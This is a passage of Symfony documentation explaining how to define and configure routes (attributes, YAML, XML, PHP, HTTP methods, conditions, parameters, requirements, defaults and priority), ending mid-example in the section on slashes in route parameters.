.. _routing-creating-routes:

Creating Routes
---------------

Routes can be configured in YAML, XML, PHP or using attributes.
All formats provide the same features and performance, so choose
your favorite.
:ref:`Symfony recommends attributes <best-practice-controller-attributes>`
because it's convenient to put the route and controller in the same place.

Creating Routes as Attributes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

PHP attributes allow to define routes next to the code of the
:doc:`controllers </controller>` associated to those routes. Attributes are
native in PHP 8 and higher versions, so you can use them right away.

You need to add a bit of configuration to your project before using them. If your
project uses :ref:`Symfony Flex <symfony-flex>`, this file is already created for you.
Otherwise, create the following file manually:

.. code-block:: yaml

    # config/routes/attributes.yaml
    controllers:
        resource:
            path: ../../src/Controller/
            namespace: App\Controller
        type: attribute

    kernel:
        resource: App\Kernel
        type: attribute

This configuration tells Symfony to look for routes defined as attributes on
classes declared in the ``App\Controller`` namespace and stored in the
``src/Controller/`` directory which follows the PSR-4 standard. The kernel can
act as a controller too, which is especially useful for small applications that
use Symfony as a microframework.

Suppose you want to define a route for the ``/blog`` URL in your application. To
do so, create a :doc:`controller class </controller>` like the following:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogController extends AbstractController
        {
            #[Route('/blog', name: 'blog_list')]
            public function list(): Response
            {
                // ...
            }
        }

This configuration defines a route called ``blog_list`` that matches when the
user requests the ``/blog`` URL. When the match occurs, the application runs
the ``list()`` method of the ``BlogController`` class.

.. note::

    The query string of a URL is not considered when matching routes. In this
    example, URLs like ``/blog?foo=bar`` and ``/blog?foo=bar&bar=foo`` will
    also match the ``blog_list`` route.

.. caution::

    If you define multiple PHP classes in the same file, Symfony only loads the
    routes of the first class, ignoring all the other routes.

The route name (``blog_list``) is not important for now, but it will be
essential later when :ref:`generating URLs <routing-generating-urls>`. You only
have to keep in mind that each route name must be unique in the application.

Creating Routes in YAML, XML or PHP Files
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of defining routes in the controller classes, you can define them in a
separate YAML, XML or PHP file. The main advantage is that they don't require
any extra dependency. The main drawback is that you have to work with multiple
files when checking the routing of some controller action.

The following example shows how to define in YAML/XML/PHP a route called
``blog_list`` that associates the ``/blog`` URL with the ``list()`` action of
the ``BlogController``:

.. configuration-block::

    .. code-block:: yaml

        # config/routes.yaml
        blog_list:
            path: /blog
            # the controller value has the format 'controller_class::method_name'
            controller: App\Controller\BlogController::list

            # if the action is implemented as the __invoke() method of the
            # controller class, you can skip the '::method_name' part:
            # controller: App\Controller\BlogController

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <!-- the controller value has the format 'controller_class::method_name' -->
            <route id="blog_list" path="/blog"
                   controller="App\Controller\BlogController::list"/>

            <!-- if the action is implemented as the __invoke() method of the
                 controller class, you can skip the '::method_name' part:
                 controller="App\Controller\BlogController"/> -->
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\BlogController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            $routes->add('blog_list', '/blog')
                // the controller value has the format [controller_class, method_name]
                ->controller([BlogController::class, 'list'])

                // if the action is implemented as the __invoke() method of the
                // controller class, you can skip the 'method_name' part:
                // ->controller(BlogController::class)
            ;
        };

.. note::

    By default Symfony only loads the routes defined in YAML format. If you
    define routes in XML and/or PHP formats, you need to
    :ref:`update the src/Kernel.php file <configuration-formats>`.

.. _routing-matching-http-methods:

Matching HTTP Methods
~~~~~~~~~~~~~~~~~~~~~

By default, routes match any HTTP verb (``GET``, ``POST``, ``PUT``, etc.)
Use the ``methods`` option to restrict the verbs each route should respond to:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogApiController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogApiController extends AbstractController
        {
            #[Route('/api/posts/{id}', methods: ['GET', 'HEAD'])]
            public function show(int $id): Response
            {
                // ... return a JSON response with the post
            }

            #[Route('/api/posts/{id}', methods: ['PUT'])]
            public function edit(int $id): Response
            {
                // ... edit a post
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        api_post_show:
            path:       /api/posts/{id}
            controller: App\Controller\BlogApiController::show
            methods:    GET|HEAD

        api_post_edit:
            path:       /api/posts/{id}
            controller: App\Controller\BlogApiController::edit
            methods:    PUT

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="api_post_show" path="/api/posts/{id}"
                controller="App\Controller\BlogApiController::show"
                methods="GET|HEAD"/>

            <route id="api_post_edit" path="/api/posts/{id}"
                controller="App\Controller\BlogApiController::edit"
                methods="PUT"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\BlogApiController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            $routes->add('api_post_show', '/api/posts/{id}')
                ->controller([BlogApiController::class, 'show'])
                ->methods(['GET', 'HEAD'])
            ;
            $routes->add('api_post_edit', '/api/posts/{id}')
                ->controller([BlogApiController::class, 'edit'])
                ->methods(['PUT'])
            ;
        };

.. tip::

    HTML forms only support ``GET`` and ``POST`` methods. If you're calling a
    route with a different method from an HTML form, add a hidden field called
    ``_method`` with the method to use (e.g. ``<input type="hidden" name="_method" value="PUT">``).
    If you create your forms with :doc:`Symfony Forms </forms>` this is done
    automatically for you when the :ref:`framework.http_method_override <configuration-framework-http_method_override>`
    option is ``true``.

.. _routing-matching-expressions:

Matching Expressions
~~~~~~~~~~~~~~~~~~~~

Use the ``condition`` option if you need some route to match based on some
arbitrary matching logic:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/DefaultController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class DefaultController extends AbstractController
        {
            #[Route(
                '/contact',
                name: 'contact',
                condition: "context.getMethod() in ['GET', 'HEAD'] and request.headers.get('User-Agent') matches '/firefox/i'",
                // expressions can also include config parameters:
                // condition: "request.headers.get('User-Agent') matches '%app.allowed_browsers%'"
            )]
            public function contact(): Response
            {
                // ...
            }

            #[Route(
                '/posts/{id}',
                name: 'post_show',
                // expressions can retrieve route parameter values using the "params" variable
                condition: "params['id'] < 1000"
            )]
            public function showPost(int $id): Response
            {
                // ... return a JSON response with the post
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        contact:
            path:       /contact
            controller: 'App\Controller\DefaultController::contact'
            condition:  "context.getMethod() in ['GET', 'HEAD'] and request.headers.get('User-Agent') matches '/firefox/i'"
            # expressions can also include configuration parameters:
            # condition: "request.headers.get('User-Agent') matches '%app.allowed_browsers%'"
            # expressions can even use environment variables:
            # condition: "context.getHost() == env('APP_MAIN_HOST')"

        post_show:
            path:       /posts/{id}
            controller: 'App\Controller\DefaultController::showPost'
            # expressions can retrieve route parameter values using the "params" variable
            condition:  "params['id'] < 1000"

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="contact" path="/contact" controller="App\Controller\DefaultController::contact">
                <condition>context.getMethod() in ['GET', 'HEAD'] and request.headers.get('User-Agent') matches '/firefox/i'</condition>
                <!-- expressions can also include configuration parameters: -->
                <!-- <condition>request.headers.get('User-Agent') matches '%app.allowed_browsers%'</condition> -->
                <!-- expressions can even use environment variables: -->
                <!-- <condition>context.getHost() == env('APP_MAIN_HOST')</condition> -->
            </route>

            <route id="post_show" path="/posts/{id}" controller="App\Controller\DefaultController::showPost">
                <!-- expressions can retrieve route parameter values using the "params" variable -->
                <condition>params['id'] &lt; 1000</condition>
            </route>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\DefaultController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            $routes->add('contact', '/contact')
                ->controller([DefaultController::class, 'contact'])
                ->condition('context.getMethod() in ["GET", "HEAD"] and request.headers.get("User-Agent") matches "/firefox/i"')
                // expressions can also include configuration parameters:
                // ->condition('request.headers.get("User-Agent") matches "%app.allowed_browsers%"')
                // expressions can even use environment variables:
                // ->condition('context.getHost() == env("APP_MAIN_HOST")')
            ;
            $routes->add('post_show', '/posts/{id}')
                ->controller([DefaultController::class, 'showPost'])
                // expressions can retrieve route parameter values using the "params" variable
                ->condition('params["id"] < 1000')
            ;
        };

The value of the ``condition`` option is an expression using any valid
:doc:`expression language syntax </reference/formats/expression_language>` and
can use any of these variables created by Symfony:

``context``
    An instance of :class:`Symfony\\Component\\Routing\\RequestContext`,
    which holds the most fundamental information about the route being matched.

``request``
    The :ref:`Symfony Request <component-http-foundation-request>` object that
    represents the current request.

``params``
    An array of matched :ref:`route parameters <routing-route-parameters>` for
    the current route.

You can also use these functions:

``env(string $name)``
    Returns the value of a variable using :doc:`Environment Variable Processors <configuration/env_var_processors>`

``service(string $alias)``
    Returns a routing condition service.

    First, add the ``#[AsRoutingConditionService]`` attribute or ``routing.condition_service``
    tag to the services that you want to use in route conditions::

        use Symfony\Bundle\FrameworkBundle\Routing\Attribute\AsRoutingConditionService;
        use Symfony\Component\HttpFoundation\Request;

        #[AsRoutingConditionService(alias: 'route_checker')]
        class RouteChecker
        {
            public function check(Request $request): bool
            {
                // ...
            }
        }

    Then, use the ``service()`` function to refer to that service inside conditions::

        // Controller (using an alias):
        #[Route(condition: "service('route_checker').check(request)")]
        // Or without alias:
        #[Route(condition: "service('App\\\Service\\\RouteChecker').check(request)")]

Behind the scenes, expressions are compiled down to raw PHP. Because of this,
using the ``condition`` key causes no extra overhead beyond the time it takes
for the underlying PHP to execute.

.. caution::

    Conditions are *not* taken into account when generating URLs (which is
    explained later in this article).

Debugging Routes
~~~~~~~~~~~~~~~~

As your application grows, you'll eventually have a *lot* of routes. Symfony
includes some commands to help you debug routing issues. First, the ``debug:router``
command lists all your application routes in the same order in which Symfony
evaluates them:

.. code-block:: terminal

    $ php bin/console debug:router

    ----------------  -------  -------  -----  --------------------------------------------
    Name              Method   Scheme   Host   Path
    ----------------  -------  -------  -----  --------------------------------------------
    homepage          ANY      ANY      ANY    /
    contact           GET      ANY      ANY    /contact
    contact_process   POST     ANY      ANY    /contact
    article_show      ANY      ANY      ANY    /articles/{_locale}/{year}/{title}.{_format}
    blog              ANY      ANY      ANY    /blog/{page}
    blog_show         ANY      ANY      ANY    /blog/{slug}
    ----------------  -------  -------  -----  --------------------------------------------

Pass the name (or part of the name) of some route to this argument to print the
route details:

.. code-block:: terminal

    $ php bin/console debug:router app_lucky_number

    +-------------+---------------------------------------------------------+
    | Property    | Value                                                   |
    +-------------+---------------------------------------------------------+
    | Route Name  | app_lucky_number                                        |
    | Path        | /lucky/number/{max}                                     |
    | ...         | ...                                                     |
    | Options     | compiler_class: Symfony\Component\Routing\RouteCompiler |
    |             | utf8: true                                              |
    +-------------+---------------------------------------------------------+

.. tip::

    Use the ``--show-aliases`` option to show all available aliases for a given
    route.

The other command is called ``router:match`` and it shows which route will match
the given URL. It's useful to find out why some URL is not executing the
controller action that you expect:

.. code-block:: terminal

    $ php bin/console router:match /lucky/number/8

      [OK] Route "app_lucky_number" matches

.. _routing-route-parameters:

Route Parameters
----------------

The previous examples defined routes where the URL never changes (e.g. ``/blog``).
However, it's common to define routes where some parts are variable. For example,
the URL to display some blog post will probably include the title or slug
(e.g. ``/blog/my-first-post`` or ``/blog/all-about-symfony``).

In Symfony routes, variable parts are wrapped in ``{ }``.
For example, the route to display the blog post contents is defined as ``/blog/{slug}``:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogController extends AbstractController
        {
            // ...

            #[Route('/blog/{slug}', name: 'blog_show')]
            public function show(string $slug): Response
            {
                // $slug will equal the dynamic part of the URL
                // e.g. at /blog/yay-routing, then $slug='yay-routing'

                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        blog_show:
            path:       /blog/{slug}
            controller: App\Controller\BlogController::show

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="blog_show" path="/blog/{slug}"
                   controller="App\Controller\BlogController::show"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\BlogController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            $routes->add('blog_show', '/blog/{slug}')
                ->controller([BlogController::class, 'show'])
            ;
        };

The name of the variable part (``{slug}`` in this example) is used to create a
PHP variable where that route content is stored and passed to the controller.
If a user visits the ``/blog/my-first-post`` URL, Symfony executes the ``show()``
method in the ``BlogController`` class and passes a ``$slug = 'my-first-post'``
argument to the ``show()`` method.

Routes can define any number of parameters, but each of them can only be used
once on each route (e.g. ``/blog/posts-about-{category}/page/{pageNumber}``).

.. _routing-requirements:

Parameters Validation
~~~~~~~~~~~~~~~~~~~~~

Imagine that your application has a ``blog_show`` route (URL: ``/blog/{slug}``)
and a ``blog_list`` route (URL: ``/blog/{page}``). Given that route parameters
accept any value, there's no way to differentiate both routes.

If the user requests ``/blog/my-first-post``, both routes will match and Symfony
will use the route which was defined first. To fix this, add some validation to
the ``{page}`` parameter using the ``requirements`` option:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogController extends AbstractController
        {
            #[Route('/blog/{page}', name: 'blog_list', requirements: ['page' => '\d+'])]
            public function list(int $page): Response
            {
                // ...
            }

            #[Route('/blog/{slug}', name: 'blog_show')]
            public function show($slug): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        blog_list:
            path:       /blog/{page}
            controller: App\Controller\BlogController::list
            requirements:
                page: '\d+'

        blog_show:
            path:       /blog/{slug}
            controller: App\Controller\BlogController::show

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="blog_list" path="/blog/{page}" controller="App\Controller\BlogController::list">
                <requirement key="page">\d+</requirement>
            </route>

            <route id="blog_show" path="/blog/{slug}"
                   controller="App\Controller\BlogController::show"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\BlogController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('blog_list', '/blog/{page}')
                ->controller([BlogController::class, 'list'])
                ->requirements(['page' => '\d+'])
            ;

            $routes->add('blog_show', '/blog/{slug}')
                ->controller([BlogController::class, 'show'])
            ;
            // ...
        };

The ``requirements`` option defines the `PHP regular expressions`_ that route
parameters must match for the entire route to match. In this example, ``\d+`` is
a regular expression that matches a *digit* of any length. Now:

========================  =============  ===============================
URL                       Route          Parameters
========================  =============  ===============================
``/blog/2``               ``blog_list``  ``$page`` = ``2``
``/blog/my-first-post``   ``blog_show``  ``$slug`` = ``my-first-post``
========================  =============  ===============================

.. tip::

    The :class:`Symfony\\Component\\Routing\\Requirement\\Requirement` enum
    contains a collection of commonly used regular-expression constants such as
    digits, dates and UUIDs which can be used as route parameter requirements.

.. tip::

    Route requirements (and route paths too) can include
    :ref:`configuration parameters <configuration-parameters>`, which is useful to
    define complex regular expressions once and reuse them in multiple routes.

.. tip::

    Parameters also support `PCRE Unicode properties`_, which are escape
    sequences that match generic character types. For example, ``\p{Lu}``
    matches any uppercase character in any language, ``\p{Greek}`` matches any
    Greek characters, etc.

.. note::

    When using regular expressions in route parameters, you can set the ``utf8``
    route option to ``true`` to make any ``.`` character match any UTF-8
    characters instead of just a single byte.

If you prefer, requirements can be inlined in each parameter using the syntax
``{parameter_name<requirements>}``. This feature makes configuration more
concise, but it can decrease route readability when requirements are complex:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogController extends AbstractController
        {
            #[Route('/blog/{page<\d+>}', name: 'blog_list')]
            public function list(int $page): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        blog_list:
            path:       /blog/{page<\d+>}
            controller: App\Controller\BlogController::list

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="blog_list" path="/blog/{page<\d+>}"
                   controller="App\Controller\BlogController::list"/>

            <!-- ... -->
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\BlogController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('blog_list', '/blog/{page<\d+>}')
                ->controller([BlogController::class, 'list'])
            ;
            // ...
        };

Optional Parameters
~~~~~~~~~~~~~~~~~~~

In the previous example, the URL of ``blog_list`` is ``/blog/{page}``. If users
visit ``/blog/1``, it will match. But if they visit ``/blog``, it will **not**
match. As soon as you add a parameter to a route, it must have a value.

You can make ``blog_list`` once again match when the user visits ``/blog`` by
adding a default value for the ``{page}`` parameter. When using attributes,
default values are defined in the arguments of the controller action. In the
other configuration formats they are defined with the ``defaults`` option:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogController extends AbstractController
        {
            #[Route('/blog/{page}', name: 'blog_list', requirements: ['page' => '\d+'])]
            public function list(int $page = 1): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        blog_list:
            path:       /blog/{page}
            controller: App\Controller\BlogController::list
            defaults:
                page: 1
            requirements:
                page: '\d+'

        blog_show:
            # ...

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="blog_list" path="/blog/{page}" controller="App\Controller\BlogController::list">
                <default key="page">1</default>

                <requirement key="page">\d+</requirement>
            </route>

            <!-- ... -->
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\BlogController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('blog_list', '/blog/{page}')
                ->controller([BlogController::class, 'list'])
                ->defaults(['page' => 1])
                ->requirements(['page' => '\d+'])
            ;
        };

Now, when the user visits ``/blog``, the ``blog_list`` route will match and
``$page`` will default to a value of ``1``.

.. caution::

    You can have more than one optional parameter (e.g. ``/blog/{slug}/{page}``),
    but everything after an optional parameter must be optional. For example,
    ``/{page}/blog`` is a valid path, but ``page`` will always be required
    (i.e. ``/blog`` will not match this route).

If you want to always include some default value in the generated URL (for
example to force the generation of ``/blog/1`` instead of ``/blog`` in the
previous example) add the ``!`` character before the parameter name: ``/blog/{!page}``

As it happens with requirements, default values can also be inlined in each
parameter using the syntax ``{parameter_name?default_value}``. This feature
is compatible with inlined requirements, so you can inline both in a single
parameter:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogController extends AbstractController
        {
            #[Route('/blog/{page<\d+>?1}', name: 'blog_list')]
            public function list(int $page): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        blog_list:
            path:       /blog/{page<\d+>?1}
            controller: App\Controller\BlogController::list

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="blog_list" path="/blog/{page<\d+>?1}"
                   controller="App\Controller\BlogController::list"/>

            <!-- ... -->
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\BlogController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('blog_list', '/blog/{page<\d+>?1}')
                ->controller([BlogController::class, 'list'])
            ;
        };

.. tip::

    To give a ``null`` default value to any parameter, add nothing after the
    ``?`` character (e.g. ``/blog/{page?}``). If you do this, don't forget to
    update the types of the related controller arguments to allow passing
    ``null`` values (e.g. replace ``int $page`` by ``?int $page``).

Priority Parameter
~~~~~~~~~~~~~~~~~~

Symfony evaluates routes in the order they are defined. If the path of a route
matches many different patterns, it might prevent other routes from being
matched. In YAML and XML you can move the route definitions up or down in the
configuration file to control their priority. In routes defined as PHP
attributes this is much harder to do, so you can set the
optional ``priority`` parameter in those routes to control their priority:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogController extends AbstractController
        {
            /**
             * This route has a greedy pattern and is defined first.
             */
            #[Route('/blog/{slug}', name: 'blog_show')]
            public function show(string $slug): Response
            {
                // ...
            }

            /**
             * This route could not be matched without defining a higher priority than 0.
             */
            #[Route('/blog/list', name: 'blog_list', priority: 2)]
            public function list(): Response
            {
                // ...
            }
        }

The priority parameter expects an integer value. Routes with higher priority
are sorted before routes with lower priority. The default value when it is not
defined is ``0``.

Parameter Conversion
~~~~~~~~~~~~~~~~~~~~

A common routing need is to convert the value stored in some parameter (e.g. an
integer acting as the user ID) into another value (e.g. the object that
represents the user). This feature is called a "param converter".

Now, keep the previous route configuration, but change the arguments of the
controller action. Instead of ``string $slug``, add ``BlogPost $post``::

    // src/Controller/BlogController.php
    namespace App\Controller;

    use App\Entity\BlogPost;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class BlogController extends AbstractController
    {
        // ...

        #[Route('/blog/{slug}', name: 'blog_show')]
        public function show(BlogPost $post): Response
        {
            // $post is the object whose slug matches the routing parameter

            // ...
        }
    }

If your controller arguments include type-hints for objects (``BlogPost`` in
this case), the "param converter" makes a database request to find the object
using the request parameters (``slug`` in this case). If no object is found,
Symfony generates a 404 response automatically.

Check out the :ref:`Doctrine param conversion documentation <doctrine-entity-value-resolver>`
to learn about the ``#[MapEntity]`` attribute that can be used to customize the
database queries used to fetch the object from the route parameter.

Backed Enum Parameters
~~~~~~~~~~~~~~~~~~~~~~

You can use PHP `backed enumerations`_ as route parameters because Symfony will
convert them automatically to their scalar values.

.. code-block:: php-attributes

    // src/Controller/OrderController.php
    namespace App\Controller;

    use App\Enum\OrderStatusEnum;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class OrderController extends AbstractController
    {
        #[Route('/orders/list/{status}', name: 'list_orders_by_status')]
        public function list(OrderStatusEnum $status = OrderStatusEnum::Paid): Response
        {
            // ...
        }
    }

Special Parameters
~~~~~~~~~~~~~~~~~~

In addition to your own parameters, routes can include any of the following
special parameters created by Symfony:

.. _routing-format-parameter:
.. _routing-locale-parameter:

``_controller``
    This parameter is used to determine which controller and action is executed
    when the route is matched.

``_format``
    The matched value is used to set the "request format" of the ``Request`` object.
    This is used for such things as setting the ``Content-Type`` of the response
    (e.g. a ``json`` format translates into a ``Content-Type`` of ``application/json``).

``_fragment``
    Used to set the fragment identifier, which is the optional last part of a URL that
    starts with a ``#`` character and is used to identify a portion of a document.

``_locale``
    Used to set the :ref:`locale <translation-locale-url>` on the request.

You can include these attributes (except ``_fragment``) both in individual routes
and in route imports. Symfony defines some special attributes with the same name
(except for the leading underscore) so you can define them easier:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/ArticleController.php
        namespace App\Controller;

        // ...
        class ArticleController extends AbstractController
        {
            #[Route(
                path: '/articles/{_locale}/search.{_format}',
                locale: 'en',
                format: 'html',
                requirements: [
                    '_locale' => 'en|fr',
                    '_format' => 'html|xml',
                ],
            )]
            public function search(): Response
            {
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        article_search:
          path:        /articles/{_locale}/search.{_format}
          controller:  App\Controller\ArticleController::search
          locale:      en
          format:      html
          requirements:
              _locale: en|fr
              _format: html|xml

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="article_search"
                path="/articles/{_locale}/search.{_format}"
                controller="App\Controller\ArticleController::search"
                locale="en"
                format="html">

                <requirement key="_locale">en|fr</requirement>
                <requirement key="_format">html|xml</requirement>

            </route>
        </routes>

    .. code-block:: php

        // config/routes.php
        namespace Symfony\Component\Routing\Loader\Configurator;

        use App\Controller\ArticleController;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('article_show', '/articles/{_locale}/search.{_format}')
                ->controller([ArticleController::class, 'search'])
                ->locale('en')
                ->format('html')
                ->requirements([
                    '_locale' => 'en|fr',
                    '_format' => 'html|xml',
                ])
            ;
        };

Extra Parameters
~~~~~~~~~~~~~~~~

In the ``defaults`` option of a route you can optionally define parameters not
included in the route configuration. This is useful to pass extra arguments to
the controllers of the routes:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogController extends AbstractController
        {
            #[Route('/blog/{page}', name: 'blog_index', defaults: ['page' => 1, 'title' => 'Hello world!'])]
            public function index(int $page, string $title): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        blog_index:
            path:       /blog/{page}
            controller: App\Controller\BlogController::index
            defaults:
                page: 1
                title: "Hello world!"

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="blog_index" path="/blog/{page}" controller="App\Controller\BlogController::index">
                <default key="page">1</default>
                <default key="title">Hello world!</default>
            </route>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\BlogController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('blog_index', '/blog/{page}')
                ->controller([BlogController::class, 'index'])
                ->defaults([
                    'page'  => 1,
                    'title' => 'Hello world!',
                ])
            ;
        };

.. _routing-slash-in-parameters:

Slash Characters in Route Parameters
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Route parameters can contain any values except the ``/`` slash character,
because that's the character used to separate the different parts of the URLs.
For example, if the ``token`` value in the ``/share/{token}`` route contains a
``/`` character, this route won't match.

A possible solution is to change the parameter requirements to be more permissive:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/DefaultController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class DefaultController extends AbstractController
        {
